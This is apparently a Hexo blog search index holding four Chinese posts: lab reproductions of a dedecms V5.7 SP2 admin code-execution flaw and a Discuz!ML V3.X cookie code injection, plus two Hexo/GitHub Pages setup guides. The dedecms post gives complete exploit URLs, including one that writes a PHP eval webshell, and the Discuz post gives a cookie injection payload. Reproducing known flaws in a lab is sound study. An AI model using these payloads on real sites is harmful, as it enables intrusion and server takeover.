<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>dedecms V5.7-UTF-8-SP2 命令执行漏洞复现</title>
      <link href="/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
      <url>/2019/07/23/dedecms-v5.7-utf-8-sp2-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞详情"><a href="#一、漏洞详情" class="headerlink" title="一、漏洞详情"></a>一、漏洞详情</h1><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724101304.png" alt></p><hr><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><p>环境搭建这里不再赘述，搭建好后访问网站主页<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102343.png" alt></p><p>dedecms默认的后台是/dede,没有修改直接访问登陆<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102453.png" alt></p><p>根据公开的漏洞知道tpl.php里面251-281行存在代码执行漏洞，打开tpl.php文件<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724102828.png" alt></p><p><strong>代码分析</strong></p><pre><code>(1)此处定义了一个savetagfile的函数，首先做一个判断，参数“action”是否等于savetagfile，如果等于，就进行下一步(2)csrf_chack(),这里有一个csrf检验的函数，我们需要加上token来绕过，token是登陆的令牌，当我们向服务器发送登录请求时，在客户端会生成一个用于验证的令牌。(3)正则表达式匹配，详情参见https://www.runoob.com/regexp/regexp-rule.html*   [a-z0-9_-]{1,}的意思是，匹配所有包含一个以上的字母数字下划线和横杠，后面的\.意思是匹配小数点   所以最终那个判断条件的意思是如果参数filename不符合上述的匹配条件，那么就不允许修改操作的进行，所以文件名必须要.lib.php结尾。(4)preg_replace的意思是执行一个正则表达式的搜索和替换，我们可以通过例子来分析一下,发现得到的$tagname的值为moonsec(5)stripslashes()的作用是引用用一个引用字符串，此处没有多大的作用(6)最后是把$content里的内容写入到相对用的路径里，问题就出在了这里，这一部分代码除了对写入的文件名字做了简单的过滤，除了有一个csrf防护之外，其他并没有什么安全措施，        导致我们可以任意写入代码，如果我们直接写入一句话木马，那么就可以直接连上去拿webshell了</code></pre><p>根据上面的代码知道要上传的参数有：action,token,filename,content.现在只剩下获取token了，要怎么才能获取到token呢？我们再去tpl.php里看一下，发现action的参数有很多，比如del，upoladok，edit，upload等等，但只有传入upload的时候页面才会回显正常，而其他的都会显示token异常，所以只能通过action=upload来获取token。</p><hr><h1 id="三-、漏洞复现"><a href="#三-、漏洞复现" class="headerlink" title="三 、漏洞复现"></a>三 、漏洞复现</h1><p>获取token，访问 域名 + /dede/tpl.php?action=upload<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104103.png" alt><br>然后查看网页源代码，找到token<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104145.png" alt><br>构造payload如下<br><a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=(文件名随意).lib.php&amp;action=savetagfile&amp;content=%3C?php%20phpinfo();?%3E&amp;token=f1ccc319d5c897a3a362335792a21e05(替换你复制的token)</a><br>访问了成功写入<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104653.png" alt><br>访问写入的文件，域名+include/taglib/（你上传的文件名）.lib.php<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724104810.png" alt><br>也可以构造一句话木马payload，<a href="http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929" target="_blank" rel="noopener">http://192.168.159.130/dede5.7/dede/tpl.php?filename=caidao.lib.php&amp;action=savetagfile&amp;content=%3C?php%20@eval($_POST[%27dylan%27])?%3E&amp;token=2d7ef87e9828edaad2d7b6bbe37f1929</a><br>直接用菜刀连接<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724105245.png" alt></p><hr><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>虽然这个漏洞很鸡肋，需要拿到管理员账号密码才行，但还是有必要复现了解，反复练习才能有进步。</p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2018-01221" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://blog.csdn.net/qq_41954384/article/details/93057317" target="_blank" rel="noopener">dedeCMS后台代码执行漏洞-CNVD-2018-01221</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> dedecms </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Discuz ML! V3.X 代码注入漏洞复现</title>
      <link href="/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/"/>
      <url>/2019/07/22/discuz-ml-v3.x-dai-ma-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<h1 id="一、漏洞详情"><a href="#一、漏洞详情" class="headerlink" title="一、漏洞详情"></a>一、漏洞详情</h1><p>2019年7月11日， Discuz！ML被发现存在一处远程代码执行漏洞，<br>攻击者通过在请求流量的cookie字段中的language参数处插入构造的payload，<br>进行远程代码执行利用，该漏洞利用方式简单，危害性较大。<br>本次漏洞是由于Discuz! ML对于cookie字段的不恰当处理造成的<br>cookie字段中的language参数未经过滤，直接被拼接写入缓存文件之中，<br>而缓存文件随后又被加载，从而造成代码执行</p><p><strong>漏洞影响版本：</strong><br>Discuz!ML v.3.4 、Discuz!ML v.3.2 、Discuz!ML v.3.3 product of codersclub.org</p><hr><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><p>本地搭建Discuz！ML 环境<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724113043.png" alt></p><p>在主页进行抓包，修改Language的值，添加  <code>&#39;.phpinfo().&#39;</code><br>成功复现该漏洞<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190724114153.png" alt></p><hr><h1 id="三、漏洞修复"><a href="#三、漏洞修复" class="headerlink" title="三、漏洞修复"></a>三、漏洞修复</h1><p>由于代码包含的原因，所以注入到缓存文件中的恶意代码直接执行，其中首页就有包涵，<br>全局搜索一下的话，应该有不少地方有进行包含可以直接利用，危害很大。<br>VulkeyChen师傅的建议：单看语言这个点，在/source/class/discuz/discuz_application.php<br>第338行之后341行之前加入该代码暂缓此安全问题：</p><pre><code>$lng = str_replace(&quot;(&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;)&quot;,&quot;&quot;,$lng);$lng = str_replace(&quot;&#39;&quot;,&quot;&quot;,$lng);$lng = str_replace(&#39;&quot;&#39;,&quot;&quot;,$lng);$lng = str_replace(&#39;`&#39;,&quot;&quot;,$lng);</code></pre><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://blog.topsec.com.cn/discuz-ml-v3-x-代码注入漏洞深度分析/" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞深度分析</a><br><a href="https://www.cnblogs.com/-mo-/p/11180396.html" target="_blank" rel="noopener">Discuz ML! V3.X 代码注入漏洞</a></p>]]></content>
      
      
      <categories>
          
          <category> Information Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
            <tag> 复现 </tag>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github分支备份hexo</title>
      <link href="/2019/07/05/github-fen-zhi-bei-fen-hexo/"/>
      <url>/2019/07/05/github-fen-zhi-bei-fen-hexo/</url>
      
        <content type="html"><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>使用hexo搭建个人博客框架，配置起来有些消耗时间，管理起来也不是特别方便。特别是有时需要在其他电脑上写博客时，就让人头疼。所以我们就利用Github的分支，来备份hexo，方便快速搭上手写博客。</p><hr><h1 id="二、创建本地分支目录"><a href="#二、创建本地分支目录" class="headerlink" title="二、创建本地分支目录"></a>二、创建本地分支目录</h1><h2 id="1-新建文件夹存放分支工作目录。"><a href="#1-新建文件夹存放分支工作目录。" class="headerlink" title="1. 新建文件夹存放分支工作目录。"></a>1. 新建文件夹存放分支工作目录。</h2><p><code>mkdir hexo</code></p><h2 id="2-把你的GitHub的远程仓库克隆到hexo文件夹"><a href="#2-把你的GitHub的远程仓库克隆到hexo文件夹" class="headerlink" title="2. 把你的GitHub的远程仓库克隆到hexo文件夹"></a>2. 把你的GitHub的远程仓库克隆到hexo文件夹</h2><p><code>git clone https://github.com/yourusername/yourusername.github.io hexo</code></p><h2 id="3-删除除了版本管理的-git之外的所有文件和文件夹"><a href="#3-删除除了版本管理的-git之外的所有文件和文件夹" class="headerlink" title="3. 删除除了版本管理的.git之外的所有文件和文件夹"></a>3. 删除除了版本管理的.git之外的所有文件和文件夹</h2><pre><code>cd hexorm -r *</code></pre><h2 id="4-把要备份的文件复制到hexo目录"><a href="#4-把要备份的文件复制到hexo目录" class="headerlink" title="4. 把要备份的文件复制到hexo目录"></a>4. 把要备份的文件复制到hexo目录</h2><pre><code>scaffolds/source/themes/.git/.gitignore_config.ymlpackage.json</code></pre><blockquote><p>注意：<br>如果使用的主题是从Github克隆的，那么使用命令删除它的Git文件（以next主题为例）<br><code>rm -R themes/next/.git*</code></p></blockquote><hr><h1 id="三、创建分支"><a href="#三、创建分支" class="headerlink" title="三、创建分支"></a>三、创建分支</h1><h2 id="1-新建仓库"><a href="#1-新建仓库" class="headerlink" title="1. 新建仓库"></a>1. 新建仓库</h2><p>在blog项目仓库下，输入备份分支hexo，点击create创建（因为我已经创建过了，所以显示的不一样）<br>或者在本地使用命令 <code>git checkout -b hexo</code><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705133032.png" alt></p><h2 id="2-点击设置，把默认分支设置为新建的备份分支"><a href="#2-点击设置，把默认分支设置为新建的备份分支" class="headerlink" title="2. 点击设置，把默认分支设置为新建的备份分支"></a>2. 点击设置，把默认分支设置为新建的备份分支</h2><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132053.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705132123.png" alt></p><hr><h1 id="四、提交备份"><a href="#四、提交备份" class="headerlink" title="四、提交备份"></a>四、提交备份</h1><p>在本地的hexo文件夹打开git bash，依次执行以下命令：</p><pre><code>git add -all   #保存所有文件到暂存区git commit -m &quot;创建hexo分支&quot; #提交变更git push --set-upstream origin hexo#推送到Github，并用`--set-upstream`与origin创建关联#将hexo设置为默认分区</code></pre><hr><h1 id="五、合并管理"><a href="#五、合并管理" class="headerlink" title="五、合并管理"></a>五、合并管理</h1><p>将本地hexo分支中的.git文件夹复制到博客根目录中，<br>我们只需要手动管理hexo分支中的文件（备份），<br>.gitignore之外的文件由hexo管理（hexo d）<br>移除主题目录下的Git管理文件</p><p><code>rm -R themes/next/.git* #以next主题为例</code></p><p>master分支的文件则由hexo管理，编辑hexo配置文件<em>_config.yml</em></p><pre><code>deploy:        type: git        repo: https://github.com/yourusername/yourusername.github.io        branch: master</code></pre><hr><h1 id="六、发表文章及修改配置"><a href="#六、发表文章及修改配置" class="headerlink" title="六、发表文章及修改配置"></a>六、发表文章及修改配置</h1><h2 id="1-将相关更改（配置修改或发表文章）推送到hexo分支"><a href="#1-将相关更改（配置修改或发表文章）推送到hexo分支" class="headerlink" title="1. 将相关更改（配置修改或发表文章）推送到hexo分支"></a>1. 将相关更改（配置修改或发表文章）推送到hexo分支</h2><pre><code>git add .git commit -m &quot;修改配置/发表文章&quot;git push origin hexo</code></pre><h2 id="2-将静态文件推送到master分支"><a href="#2-将静态文件推送到master分支" class="headerlink" title="2. 将静态文件推送到master分支"></a>2. 将静态文件推送到master分支</h2><pre><code>hexo clean hexo ghexo d</code></pre><hr><h1 id="七、迁移"><a href="#七、迁移" class="headerlink" title="七、迁移"></a>七、迁移</h1><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><pre><code>npm install -g hexo-clihexo initnpm install</code></pre><h2 id="2-克隆hexo分支"><a href="#2-克隆hexo分支" class="headerlink" title="2. 克隆hexo分支"></a>2. 克隆hexo分支</h2><p><code>git clone -b hexo https://github.com/username/username.github.io</code></p><hr><p>这样就可以进行写作了，写完记得同步备份博客。</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/white_idiot/article/details/80685990" target="_blank" rel="noopener">【GitHub】创建Git分支将Hexo博客迁移到其它电脑</a></p>]]></content>
      
      
      <categories>
          
          <category> Blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> hexo </tag>
            
            <tag> 备份 </tag>
            
            <tag> 分支 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages+Hexo搭建个人博客（踩坑之路）</title>
      <link href="/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/"/>
      <url>/2019/07/04/li-yong-github-pages-da-jian-ge-ren-bo-ke-cai-keng-zhi-lu/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>其实很早之前就想搭建一个个人博客，出于各种原因，一直没有行动。最近终于着手开始搭建，希望自己可以一直坚持下去。在搭建的过程中，踩了不少坑，特此记录，也希望对后来人有一点点参考价值。</p><hr><h1 id="一、Github"><a href="#一、Github" class="headerlink" title="一、Github"></a>一、Github</h1><h2 id="1-注册Github账号"><a href="#1-注册Github账号" class="headerlink" title="1. 注册Github账号"></a>1. 注册Github账号</h2><p>进入<a href="https://github.com" target="_blank" rel="noopener">Github</a>官网，注册账号。</p><h2 id="2-创建仓库"><a href="#2-创建仓库" class="headerlink" title="2. 创建仓库"></a>2. 创建仓库</h2><p>点击首页右上角头像左侧的头像<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705010509.png" alt><br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011051.png" alt></p><h2 id="3-Github-Pages"><a href="#3-Github-Pages" class="headerlink" title="3. Github Pages"></a>3. Github Pages</h2><p>点击Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011609.png" alt><br>找到GitHub Pages，以用户名命名的仓库自动开启github pages，确认开启后就可以通过给出的网址访问了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705011514.png" alt></p><hr><h1 id="二、Hexo"><a href="#二、Hexo" class="headerlink" title="二、Hexo"></a>二、Hexo</h1><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">hexo</a>是一个快速、简洁且高效的博客框架，可以参考官方文档。</p><h2 id="1-环境安装"><a href="#1-环境安装" class="headerlink" title="1. 环境安装"></a>1. 环境安装</h2><p>要使用hexo，必须安装<a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node.js</a>和<a href="https://git-scm.com/download/" target="_blank" rel="noopener">Git</a>。网上教程很多，这里不再赘述。</p><h2 id="2-hexo安装"><a href="#2-hexo安装" class="headerlink" title="2. hexo安装"></a>2. hexo安装</h2><p>先创建存放blog文件的文件夹，切换到此文件夹右击git bash打开<br>输入命令安装hexo：<br><code>npm install -g hexo-cli</code></p><p>依次执行：</p><pre><code>hexo init npm installhexo g #生成静态网页hexo s #启动本地服务</code></pre><p>完成后，在浏览器输入localhost:4000就可以看到你的博客了</p><hr><h1 id="三、部署到Github"><a href="#三、部署到Github" class="headerlink" title="三、部署到Github"></a>三、部署到Github</h1><h2 id="1-设置SSH"><a href="#1-设置SSH" class="headerlink" title="1. 设置SSH"></a>1. 设置SSH</h2><p>返回GIt Bash中，依次输入：</p><pre><code>git config --global.name &quot;yourname&quot;git config --global.email &quot;youremail&quot;</code></pre><p>这里的yourname输入你的Github的用户名，<br>youremail输入你的Github邮箱</p><pre><code>cd ~/.sshlsmkdir key_backupcp id_rsa* key_backuprm id_rsa*#检查有没有生成过SSH并备份移除ssh-keygen -t rsa -C &quot;youremail&quot; #生成新的SSH，接下来输入密码 一路回车</code></pre><h2 id="2-添加SSH-Key到Github"><a href="#2-添加SSH-Key到Github" class="headerlink" title="2.添加SSH Key到Github"></a>2.添加SSH Key到Github</h2><p>点击头像，选择Settings<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022259.png" alt><br>添加新的SSH Key<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022426.png" alt><br>找到c:\users\当前用户名.ssh    文本形式打开id_ras.pub (打开系统查看隐藏文件选项)<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190705022656.png" alt><br>测试是否连接成功<br><code>ssh -T git@github.com</code><br>输入yes就ok</p><h2 id="3-部署到Github"><a href="#3-部署到Github" class="headerlink" title="3. 部署到Github"></a>3. 部署到Github</h2><p>打开hexo配置文件（根目录）<strong>_config.yml</strong><br>翻到最后将xxx修改为你的Github账户（冒号后面有一个空格）</p><pre><code>deploy:    type: git    repo: https://github.com/xxx/xxx.github.io.git    branch: master</code></pre><p>然后安装deploy-git(不然报错”ERROR Deployer not found: git“)<br><code>npm install hexo-deployer-git --save</code></p><p>然后</p><pre><code>hexo cleanhexo ghexo d</code></pre><p>deploy时可能要你输入密码，再刷新username.github.io就可以看到你的blog。</p><hr><p><strong>注意：</strong></p><blockquote><p>如果输入命令的过程中出现了”LF will be replaced by CRLF”报错，<br>    1. windows中的换行符为 CRLF，而在Linux下的换行符为LF，所以在执行add . 时出现提示<br>    2. CRLF和LF是两种不同的换行格式，git工作区默认为CRLF来作为换行符，<br>        所以当我们项目文件里有用的地方使用LF作为换行符，这个时候我们再继续git add<br>        或者git commit的时候就会弹出警告，当最终push到远程仓库的时候git会统一格式全部转化为用CRLF作为换行符 </p></blockquote><p><strong>解决办法：</strong></p><blockquote><ol><li>这个只是一个警告，我们直接忽略就好。</li><li>git config –global core.autocrlf false  //禁用自动转换 </li></ol></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
